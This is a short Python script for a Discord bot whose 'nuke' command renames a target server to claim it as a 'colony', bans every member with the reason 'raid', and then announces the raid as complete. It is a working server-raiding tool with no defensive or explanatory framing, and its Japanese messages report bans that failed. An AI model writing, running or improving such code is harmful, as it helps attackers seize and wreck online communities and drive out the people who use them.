import discord
from discord.ext import commands
import threading
import random



intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix="n!",intents=intents)




@client.command()
async def nuke(ctx,guild: discord.Guild):
  await guild.edit(name="AARRの植民地")
  for user in guild.members:
    try:
      await guild.ban(user, reason="raid")
    except:
      print("banできなかった")
  await ctx.reply(f"raid完了!")


client.run("TOKEN",bot=True)
